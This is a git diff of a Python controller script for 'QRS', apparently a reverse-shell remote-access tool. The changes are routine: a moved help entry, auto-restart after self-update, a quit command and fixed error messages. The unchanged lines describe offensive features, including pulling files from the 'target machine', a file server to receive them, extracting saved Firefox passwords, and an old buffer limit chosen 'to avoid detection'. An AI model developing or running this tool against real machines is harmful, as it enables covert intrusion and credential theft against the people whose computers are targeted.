@@ -13,6 +13,7 @@ HelpList = ["This is a List of all available commands", "===================Desc
             "=====================Commands=====================\n",
             '============Terminal Commands=============',
             "Connections - Shows all active connections and their status",
+            "Connect <client_ID> - Connects to the specified client ID",
             "Clear - Clears the screen",
             "Clear connections - Clears all connections from the list",
             "Clear inactive - Clears all inactive connections from the list",
@@ -20,8 +21,7 @@ HelpList = ["This is a List of all available commands", "===================Desc
             "Exit - Exits the reverse shell",
             "Quit - Quits QRS",
             "Help - Shows this message",
-            "============In Shell commands=============",
-            "Connect <client_id> - Connects to a specific client using its ID", 
+            "============In Shell commands=============", 
             "Start file server - Starts a file server to receive files from the target machine",
             "Download <filename> - Downloads a file from the target machine to the local machine into /received_files",
             "extract passwords firefox (<profile-ID>) - Extracts saved passwords from Firefox (provide profile ID if needed)",
@@ -275,11 +275,15 @@ while True:
         print(f"{TimeStamp()} Updating QRS...")
         try:
             subprocess.run("git pull https://github.com/the-real-N0NAME/QRS.git", shell=True, check=True)
-            print(f"{TimeStamp()} QRS updated successfully.")
+            print(f"{TimeStamp()} QRS updated successfully. Restarting...")
+            subprocess.run("python QRS.py", shell=True, check=True)
             exit(0)
         except subprocess.CalledProcessError as e:
             print(f"[!] Error occurred while updating QRS: {e.stderr}")
-
+    if cmd.lower() == "quit":
+        print(f"{TimeStamp()} Quitting QRS...")
+        exit(0)
+    
     SplitedCMD = cmd.split()
     if SplitedCMD[0].lower() == "clear":
         if len(SplitedCMD) < 2:
@@ -325,7 +329,7 @@ while True:
                         continue
                     SplitedCMD = cmd.split()
                     if SplitedCMD[0].lower() == "type":
-                        print("[*] The Buffer size is Set to 5 MB to avoid detection. If you want to see larger files use the 'download' command.")
+                        print(f"[*] The Buffer size is currently set to {BUFFER_SIZE/1000000} MB. If you want to see larger files use the 'download' command.")
                     if cmd.lower() == "help":
                         for i in HelpList:
                             print(i)
@@ -345,9 +349,9 @@ while True:
                         results, cwd = output.split(SEPARATOR)
                     except ValueError as e:
                         if "not enough values to unpack" in str(e):
-                            results = "[E] The output received from the client is most likely to long use '-f' flag at the end of the command to save the output to a file."
+                            results = f"[E] The output received from the client is most likely to long use '-f' flag at the end of the command to save the output to a file, {e}"
                     except Exception as e:
-                        results = "[!] Error occurred while receiving data: {e}"
+                        results = f"[!] Error occurred while receiving data: {e}"
                     print(results)
                 break
             except socket.timeout:
